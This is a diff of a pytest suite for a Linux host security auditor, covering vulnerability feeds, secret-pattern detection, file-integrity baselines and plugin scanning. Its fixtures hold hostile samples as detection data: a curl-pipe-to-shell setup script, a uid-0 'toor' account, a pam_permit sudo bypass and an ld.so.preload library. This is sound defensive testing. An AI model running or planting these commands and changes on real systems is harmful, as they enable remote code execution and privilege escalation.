@@ -347,20 +347,6 @@ def test_updates(v):
     assert v.check_updates()["status"] == "fail"
 
 
-def test_disk_encryption_reads_dm_uuid(v, tmp_path, monkeypatch):
-    sysfile(v, "/proc/self/mountinfo", "26 1 254:0 / / rw,relatime - btrfs /dev/mapper/root rw\n")
-    sysfile(v, "/dev/mapper/root", "")
-
-    monkeypatch.setattr(v, "_rdev", lambda p: os.makedev(254, 0) if p.endswith("/dev/mapper/root") else 0)
-    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "CRYPT-LUKS2-abc-root\n")
-    assert v.check_disk_encryption()["status"] == "pass"
-    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "LVM-xyz\n")
-    assert v.check_disk_encryption()["status"] == "fail"
-    os.makedirs(v.ROOT + "/sys/dev/block/254:0/slaves/dm-1")
-    sysfile(v, "/sys/dev/block/254:0/slaves/dm-1/dev", "254:1\n")
-    sysfile(v, "/sys/dev/block/254:1/dm/uuid", "CRYPT-LUKS2-def\n")
-    assert v.check_disk_encryption()["status"] == "pass"
-
 
 def test_listeners_skip_loopback(v):
     tcp = ("  sl  local_address rem_address   st\n"
@@ -410,16 +396,6 @@ def test_ld_preload(v):
     sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
     assert v.check_ld_preload()["status"] == "fail"
 
-
-def test_scanner_rows(v):
-    c = v.CHECKS[[f.__name__ for f in v.CHECKS].index("check_scanner_clamav")]()
-    assert c["status"] == "info" and c["fix"]["action"] == "install-clamav"
-    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
-    c = v.CHECKS[[f.__name__ for f in v.CHECKS].index("check_scanner_clamav")]()
-    assert c["status"] == "warn" and c["fix"]["action"] == "freshclam"
-    sysfile(v, "/var/lib/clamav/daily.cld", "")
-    c = v.CHECKS[[f.__name__ for f in v.CHECKS].index("check_scanner_clamav")]()
-    assert c["status"] == "info" and c["fix"]["action"] == "scan-downloads"
 
 
 # --------------------------------------------------------------------------
@@ -648,13 +624,6 @@ def test_bumblebee_states(v):
     assert v.check_bumblebee()["status"] == "unknown"
 
 
-def test_bumblebee_stale(v):
-    bumblebee(v, {"ok": True, "exposure_count": 0})
-    p = os.path.join(v.HOME, ".local/state/omarchy/bumblebee/last-scan.json")
-    old = os.path.getmtime(p) - 10 * 86400
-    os.utime(p, (old, old))
-    assert v.check_bumblebee()["status"] == "warn"
-
 
 def test_bumblebee_refuses_symlinked_cache(v, tmp_path):
     os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
@@ -816,16 +785,6 @@ def test_secrets_in_history_are_located_not_shown(v):
     assert token not in json.dumps(c)
 
 
-def test_secret_patterns(v):
-    samples = {
-        "AKIAABCDEFGHIJKLMNOP": "AWS", "export OPENAI_API_KEY=sk-proj-" + "x" * 40: "secret",
-        "-----BEGIN OPENSSH PRIVATE KEY-----": "private key", "export GITHUB_TOKEN=abcdefgh12345": "exported",
-    }
-    for line in samples:
-        assert any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
-    for line in ("export TOKEN=$OTHER", "echo hello", "git push origin main", "export PATH=/usr/bin"):
-        assert not any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
-
 
 def test_loose_credential_files(v):
     homefile(v, ".aws/credentials", "[default]\n", 0o644)
@@ -842,52 +801,6 @@ def test_credential_perms_never_follows_symlinks(v, tmp_path):
     v.run_fix("credential-perms")
     assert stat.S_IMODE(target.stat().st_mode) == 0o644
 
-
-def fake_pacman(v, lines):
-    v.TRUSTED.add(v.ROOT + "/usr/bin/pacman")
-    v.COMMANDS[("/usr/bin/pacman", "-Qm")] = (0, "".join("%s %s\n" % l for l in lines))
-
-
-def test_known_bad_list_is_valid(v):
-    pkgs, procs = v.known_bad()
-    assert len(pkgs) >= 10 and procs and all(p["name"] for p in pkgs)
-    raw = json.loads((REPO / "data" / "known-bad.json").read_text())
-    for e in raw["packages"] + raw["processes"]:
-        assert e["source"].startswith("https://"), e
-
-
-def test_known_bad_packages(v):
-    fake_pacman(v, [("yay", "12.0-1"), ("firefox-patch-bin", "1.0-1")])
-    c = v.check_known_bad_packages()
-    assert c["status"] == "fail" and "firefox-patch-bin" in c["detail"]
-    fake_pacman(v, [("acroread", "9.5.5-9")])          # fixed version: not the malicious one
-    assert v.check_known_bad_packages()["status"] == "pass"
-    fake_pacman(v, [("acroread", "9.5.5-8")])
-    assert v.check_known_bad_packages()["status"] == "fail"
-
-
-def test_known_bad_install_window(v):
-    import calendar
-    fake_pacman(v, [("google-chrome-stable", "140.0-1")])
-    desc = "/var/lib/pacman/local/google-chrome-stable-140.0-1/desc"
-    sysfile(v, desc, "%%INSTALLDATE%%\n%d\n" % calendar.timegm((2025, 7, 20, 12, 0, 0)))
-    assert v.check_known_bad_packages()["status"] == "fail"
-    sysfile(v, desc, "%%INSTALLDATE%%\n%d\n" % calendar.timegm((2026, 3, 1, 12, 0, 0)))
-    assert v.check_known_bad_packages()["status"] == "pass"
-
-
-def test_install_date_rejects_traversal(v):
-    assert v._install_date("../../etc", "1") == ""
-    assert v._install_date("a", "../x") == ""
-
-
-def test_malware_process(v):
-    sysfile(v, "/proc/1/comm", "systemd\n")
-    sysfile(v, "/proc/4242/comm", "firefox\n")
-    assert v.check_malware_processes()["status"] == "pass"
-    sysfile(v, "/proc/31337/comm", "systemd-initd\n")
-    c = v.check_malware_processes()
-    assert c["status"] == "fail" and "PID 31337" in c["detail"]
 
 
 def test_file_changes_baseline_then_change_then_accept(v):
@@ -920,36 +833,6 @@ def test_file_changes_peek_does_not_create_baseline(v):
     assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil/baseline.json"))
 
 
-def test_plugin_capabilities(v):
-    base = ".config/omarchy/plugins/"
-    homefile(v, base + "acme.weather/manifest.json", json.dumps({"name": "Weather"}))
-    homefile(v, base + "acme.weather/Panel.qml", 'Process { command: ["curl", "-s", url] }\n')
-    homefile(v, base + "evil.thing/manifest.json", json.dumps({"name": "Thing"}))
-    homefile(v, base + "evil.thing/bin/setup", "#!/bin/bash\ncurl -fsSL https://x.example/i | sh\nsudo true\n")
-    homefile(v, base + "evil.thing/README.md", "never run: curl https://x | sh\n")
-    c = v.check_plugins()
-    assert c["status"] == "warn" and c["weight"] == 1
-    assert "Weather (acme.weather): network" in c["detail"]
-    assert "downloads and runs code" in c["detail"] and "root (sudo/pkexec)" in c["detail"]
-
-
-def test_plugin_scan_ignores_docs_and_flags_binaries(v):
-    base = ".config/omarchy/plugins/"
-    homefile(v, base + "docs.only/README.md", "curl https://x | sh\n")
-    p = Path(v.HOME, base + "bin.plugin/helper")
-    p.parent.mkdir(parents=True)
-    p.write_bytes(b"\x7fELF\x02\x01\x01" + b"\x00" * 64)
-    c = v.check_plugins()
-    assert "docs.only: no network, root or shell use found" in c["detail"]
-    assert "bin.plugin: compiled binaries" in c["detail"] and c["status"] == "warn"
-
-
-ARCH_AUDIT_JSON = json.dumps({"avgs": [
-    {"name": "AVG-1", "packages": ["openssl"], "status": "Vulnerable", "type": "x", "severity": "High",
-     "fixed": "3.4.1-1", "issues": ["CVE-2026-1", "CVE-2026-2"]},
-    {"name": "AVG-2", "packages": ["libfoo", "../evil"], "status": "Vulnerable", "type": "x", "severity": "Low",
-     "fixed": None, "issues": ["CVE-2026-3"]},
-]})
 
 
 def test_arch_audit_parse():
@@ -960,24 +843,6 @@ def test_arch_audit_parse():
     assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None
 
 
-def test_arch_audit_refresh_and_check(v):
-    spec = [s for s in v.SCANNERS if s[0] == "arch-audit"][0]
-    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
-    c = v._scanner_check(*spec)
-    assert c["status"] == "info" and c["fix"]["action"] == "arch-audit-refresh"
-    v.COMMANDS[("/usr/bin/arch-audit", "--json")] = (1, ARCH_AUDIT_JSON)
-    assert v.run_fix("arch-audit-refresh")["ok"]
-    c = v._scanner_check(*spec)
-    assert c["status"] == "fail" and c["fix"]["action"] == "update" and "openssl: high" in c["detail"]
-    v.COMMANDS[("/usr/bin/arch-audit", "--json")] = (0, '{"avgs": []}')
-    v.run_fix("arch-audit-refresh")
-    assert v._scanner_check(*spec)["status"] == "pass"
-
-
-def test_arch_audit_refresh_fails_cleanly(v):
-    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
-    res = v.run_fix("arch-audit-refresh")                # fake run returns (None, "")
-    assert res["ok"] is False and "did not finish" in res["message"]
 
 
 def test_clamui_quarantine_count(v):
@@ -998,3 +863,291 @@ def test_plugin_scan_says_when_it_did_not_scan(v, tmp_path):
     c = v.check_plugins()
     assert "Dev Plugin (me.dev): linked from another folder (development install), not scanned" in c["detail"]
     assert "no network" not in c["detail"]
+
+
+# --------------------------------------------------------------------------
+# Maintained sources (feeds) and the false-positive rules
+
+ARCH_AUDIT_JSON = json.dumps({"avgs": [
+    {"name": "AVG-1", "packages": ["openssl"], "status": "Vulnerable", "type": "x", "severity": "High",
+     "fixed": "3.4.1-1", "issues": ["CVE-2026-1", "CVE-2026-2"]},
+    {"name": "AVG-2", "packages": ["libfoo", "../evil"], "status": "Vulnerable", "type": "x", "severity": "Low",
+     "fixed": None, "issues": ["CVE-2026-3"]},
+]})
+
+
+def test_no_hand_made_threat_lists():
+    assert not (REPO / "data" / "known-bad.json").exists()
+    src = (REPO / "bin" / "vigil").read_text()
+    assert "known_bad" not in src and "systemd-initd" not in src
+
+
+def test_disk_encryption_reads_dm_uuid(v, monkeypatch):
+    sysfile(v, "/proc/self/mountinfo", "26 1 254:0 / / rw,relatime - btrfs /dev/mapper/root rw\n")
+    monkeypatch.setattr(v, "_rdev", lambda p: os.makedev(254, 0) if p.endswith("/dev/mapper/root") else 0)
+    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "CRYPT-LUKS2-abc-root\n")
+    assert v.check_disk_encryption()["status"] == "pass"
+    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "LVM-xyz\n")
+    c = v.check_disk_encryption()
+    assert c["status"] == "warn" and v.dismissible(dict(c))   # true, but only a reinstall fixes it
+    os.makedirs(v.ROOT + "/sys/dev/block/254:0/slaves/dm-1")
+    sysfile(v, "/sys/dev/block/254:0/slaves/dm-1/dev", "254:1\n")
+    sysfile(v, "/sys/dev/block/254:1/dm/uuid", "CRYPT-LUKS2-def\n")
+    assert v.check_disk_encryption()["status"] == "pass"
+
+
+def clamav(v):
+    return [f for f in v.CHECKS if f.__name__ == "check_scanner_clamav"][0]
+
+
+def test_clamav_signatures_come_from_freshclam(v):
+    assert clamav(v)()["fix"]["action"] == "install-clamav"
+    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
+    c = clamav(v)()
+    assert c["status"] == "warn" and c["fix"]["action"] == "freshclam-service"
+    sysfile(v, "/var/lib/clamav/daily.cld", "")
+    c = clamav(v)()
+    assert c["status"] == "info" and c["fix"]["action"] == "freshclam-service"
+    v.UNITS[("is-enabled", "clamav-freshclam.service")] = "enabled"
+    c = clamav(v)()
+    assert c["status"] == "info" and "update automatically" in c["summary"] and c["fix"]["action"] == "scan-downloads"
+    p = v.ROOT + "/var/lib/clamav/daily.cld"
+    os.utime(p, (os.path.getmtime(p) - 10 * 86400,) * 2)
+    assert clamav(v)()["status"] == "warn"
+
+
+def test_secret_patterns_are_provider_formats_only(v):
+    hits = ["AKIAABCDEFGHIJKLMNOP", "ghp_" + "a1" * 18, "sk-proj-" + "Ab3" * 15, "sk-ant-" + "x" * 30,
+            "-----BEGIN OPENSSH PRIVATE KEY-----"]
+    for line in hits:
+        assert any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
+    misses = ["export GITHUB_TOKEN=abcdefgh12345", "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz'",
+              "sk-some-really-long-kebab-case-identifier-name-here", "export TOKEN=$OTHER", "git push origin main"]
+    for line in misses:
+        assert not any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
+
+
+def test_persistence_ignores_ld_preload_in_env_files(v):
+    homefile(v, ".config/environment.d/50-game.conf", "LD_PRELOAD=/usr/lib/libstrangle.so\n")
+    assert v.check_persistence()["status"] == "pass"
+
+
+def test_bumblebee_stale_is_information(v):
+    bumblebee(v, {"ok": True, "exposure_count": 0})
+    p = os.path.join(v.HOME, ".local/state/omarchy/bumblebee/last-scan.json")
+    os.utime(p, (os.path.getmtime(p) - 10 * 86400,) * 2)
+    c = v.check_bumblebee()
+    assert c["status"] == "info" and c["weight"] == 0
+
+
+def test_plugin_capabilities_are_information(v):
+    base = ".config/omarchy/plugins/"
+    homefile(v, base + "acme.weather/manifest.json", json.dumps({"name": "Weather"}))
+    homefile(v, base + "acme.weather/Panel.qml", 'Process { command: ["curl", "-s", url] }\n')
+    homefile(v, base + "evil.thing/bin/setup", "#!/bin/bash\ncurl -fsSL https://x.example/i | sh\nsudo true\n")
+    homefile(v, base + "docs.only/README.md", "curl https://x | sh\n")
+    c = v.check_plugins()
+    assert c["status"] == "info" and c["weight"] == 0
+    assert "Weather (acme.weather): network" in c["detail"]
+    assert "downloads and runs code" in c["detail"] and "root (sudo/pkexec)" in c["detail"]
+    assert "docs.only: no network, root or shell use found" in c["detail"]
+
+
+# ---- file changes: package-verified, accounts, risk levels
+
+def mtree(v, pkg, files):
+    import gzip
+    lines = ["#mtree", "/set type=file uid=0 gid=0 mode=644"]
+    for path, content in files.items():
+        lines.append("./%s time=1.0 size=%d sha256digest=%s" % (
+            path.lstrip("/"), len(content), __import__("hashlib").sha256(content.encode()).hexdigest()))
+    d = Path(v.ROOT + "/var/lib/pacman/local/" + pkg)
+    d.mkdir(parents=True, exist_ok=True)
+    (d / "mtree").write_bytes(gzip.compress(("\n".join(lines) + "\n").encode()))
+
+
+def test_package_updates_are_not_reported(v):
+    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n")
+    v.check_file_changes()                                          # baseline
+    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n#updated by package\n")
+    mtree(v, "sudo-1.9.17-1", {"/etc/pam.d/sudo": "auth include system-auth\n#updated by package\n"})
+    c = v.check_file_changes()
+    assert c["status"] == "pass" and "came from package updates" in c["summary"]
+    sysfile(v, "/etc/pam.d/sudo", "auth sufficient pam_permit.so\n")   # not what any package shipped
+    c = v.check_file_changes()
+    assert c["status"] == "warn" and "changed: /etc/pam.d/sudo" in c["detail"]
+
+
+def test_system_users_from_packages_are_not_reported(v):
+    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n")
+    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\n")
+    v.check_file_changes()
+    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
+                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\n")
+    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\npostgres:x:968:\n")
+    assert v.check_file_changes()["status"] == "pass"
+    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
+                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\ntoor:x:0:0::/:/bin/bash\n")
+    c = v.check_file_changes()
+    assert c["status"] == "warn" and "/etc/passwd" in c["detail"]
+
+
+def test_group_membership_change_is_reported(v):
+    sysfile(v, "/etc/group", "wheel:x:998:alice\n")
+    v.check_file_changes()
+    sysfile(v, "/etc/group", "wheel:x:998:alice,mallory\n")
+    assert v.check_file_changes()["status"] == "warn"
+
+
+def test_own_shell_files_are_information_only(v):
+    homefile(v, ".bashrc", "alias ll='ls -l'\n")
+    v.check_file_changes()
+    homefile(v, ".bashrc", "alias ll='ls -la'\n")
+    c = v.check_file_changes()
+    assert c["status"] == "info" and c["weight"] == 0 and c["fix"]["action"] == "integrity-accept"
+
+
+def test_vigil_own_files_are_not_watched(v):
+    v.check_file_changes()
+    assert v.run_fix("optout-on")["ok"]
+    assert v.check_file_changes()["status"] == "pass"
+
+
+def test_hosts_file_is_not_watched(v):
+    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n")
+    v.check_file_changes()
+    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n0.0.0.0 telemetry.example\n")
+    assert v.check_file_changes()["status"] == "pass"
+
+
+# ---- feeds
+
+def test_arch_audit_parse():
+    mod = load_vigil()
+    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
+    assert [p["name"] for p in got] == ["openssl", "libfoo"]
+    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None
+
+
+def arch_audit_check(v):
+    spec = [s for s in v.SCANNERS if s[0] == "arch-audit"][0]
+    return v._scanner_check(*spec)
+
+
+def test_arch_audit_feed_only_counts_what_an_update_fixes(v):
+    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
+    c = arch_audit_check(v)
+    assert c["status"] == "info" and c["fix"]["action"] == "arch-audit-refresh"
+    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
+    assert v.run_fix("arch-audit-refresh")["ok"]
+    c = arch_audit_check(v)
+    assert c["status"] == "warn" and c["fix"]["action"] == "update" and "1 serious" in c["summary"]
+    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
+    v.run_fix("arch-audit-refresh")
+    assert arch_audit_check(v)["status"] == "pass"
+
+
+def test_feed_due_and_retry(v):
+    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
+    assert v.feed_due("arch-audit") is True
+    res = v.refresh_due_feeds()                           # fake run fails: (None, "")
+    assert res["ok"] is False and "retry tomorrow" in res["message"]
+    assert v.feed_due("arch-audit") is False              # tried today, waits a day
+    p = Path(v.HOME, ".local/state/omarchy-vigil/arch-audit.json")
+    meta = json.loads(p.read_text())
+    meta["attempted"] = "2020-01-01"
+    p.write_text(json.dumps(meta))
+    assert v.feed_due("arch-audit") is True
+    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
+    assert v.refresh_due_feeds()["ok"] is True
+    assert v.feed_due("arch-audit") is False
+    meta = json.loads(p.read_text())
+    meta["at"] = "2020-01-01"
+    meta["attempted"] = "2020-01-01"
+    p.write_text(json.dumps(meta))
+    assert v.feed_due("arch-audit") is True               # a week or more old
+
+
+def test_failed_refresh_keeps_last_good_result(v):
+    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
+    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
+    v.run_fix("arch-audit-refresh")
+    del v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")]
+    assert v.run_fix("arch-audit-refresh")["ok"] is False
+    assert arch_audit_check(v)["status"] == "warn"
+
+
+def test_report_says_when_feeds_are_due(v):
+    assert v.audit(peek=True)["feedsDue"] is False
+    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
+    assert v.audit(peek=True)["feedsDue"] is True
+
+
+OSV_JSON = json.dumps({"results": [
+    {"source": {"path": "/HOME/.cache/yay/atomic-pkg/bun.lock", "type": "lockfile"},
+     "packages": [
+         {"package": {"name": "js-digest", "version": "1.0.4", "ecosystem": "npm"},
+          "vulnerabilities": [{"id": "GHSA-xxxx-yyyy-zzzz", "aliases": ["MAL-2026-1234"]}]},
+         {"package": {"name": "lodash", "version": "4.17.20", "ecosystem": "npm"},
+          "vulnerabilities": [{"id": "GHSA-35jh-r3h4-6jhm", "aliases": ["CVE-2021-23337"]}]},
+     ]}]})
+
+
+def test_osv_only_counts_confirmed_malware():
+    mod = load_vigil()
+    got = mod.parse_osv(OSV_JSON)
+    assert [(m["name"], m["id"]) for m in got] == [("js-digest", "MAL-2026-1234")]
+    assert mod.parse_osv("nope") is None and mod.parse_osv('{"results": "x"}') is None
+
+
+def test_osv_check_states(v):
+    c = v.check_osv()
+    assert c["status"] == "info" and c["fix"]["action"] == "install-osv-scanner"
+    v.TRUSTED.add(v.ROOT + "/usr/bin/osv-scanner")
+    assert v.check_osv()["status"] == "pass"              # nothing to scan
+    yay = os.path.join(v.HOME, ".cache/yay")
+    os.makedirs(yay)
+    assert v.check_osv()["fix"]["action"] == "osv-refresh"
+    argv = ("/usr/bin/osv-scanner", "--format", "json", "--no-resolve", "--recursive", "--", yay)
+    v.COMMANDS[argv] = (1, OSV_JSON.replace("/HOME", v.HOME))
+    assert v.run_fix("osv-refresh")["ok"]
+    c = v.check_osv()
+    assert c["status"] == "fail" and "js-digest 1.0.4 (npm, MAL-2026-1234) in ~/.cache/yay/atomic-pkg/bun.lock" in c["detail"]
+    assert "lodash" not in c["detail"]
+    v.COMMANDS[argv] = (128, "")                          # no lockfiles found
+    v.run_fix("osv-refresh")
+    assert v.check_osv()["status"] == "pass"
+
+
+def aur_url(names):
+    return "https://aur.archlinux.org/rpc/v5/info?" + "&".join("arg%5B%5D=" + v_pct(n) for n in names)
+
+
+def v_pct(n):
+    return "".join(c if c in "abcdefghijklmnopqrstuvwxyz0123456789._-" else "%%%02X" % ord(c) for c in n)
+
+
+def test_aur_status_is_information_only(v):
+    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
+    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\nold-thing\nmoved-pkg\norphan-pkg\nlibc++\n")
+    url = aur_url(["yay", "old-thing", "moved-pkg", "orphan-pkg", "libc++"])
+    assert "libc%2B%2B" in url
+    curl = ("/usr/bin/curl", "-q", "-sS", "--fail", "--proto", "=https", "--proto-redir", "=https",
+            "--max-time", "30", "--max-filesize", str(4 * 1024 * 1024), "--", url)
+    v.COMMANDS[curl] = (0, json.dumps({"results": [
+        {"Name": "yay", "Maintainer": "jguer"}, {"Name": "orphan-pkg", "Maintainer": None},
+        {"Name": "libc++", "Maintainer": "someone"}]}))
+    v.COMMANDS[("/usr/bin/pacman", "-Slq")] = (0, "bash\nmoved-pkg\n")
+    assert v.run_fix("aur-refresh")["ok"]
+    c = v.check_aur_status()
+    assert c["status"] == "info" and c["weight"] == 0
+    assert "no longer in the AUR: old-thing" in c["detail"]
+    assert "now in the official repositories: moved-pkg" in c["detail"]
+    assert "no maintainer (orphaned): orphan-pkg" in c["detail"]
+
+
+def test_aur_refresh_failure_is_retried(v):
+    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
+    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\n")
+    assert v.run_fix("aur-refresh")["ok"] is False        # curl fake returns nothing
+    assert v.check_aur_status()["status"] == "info" and v.feed_due("aur") is False
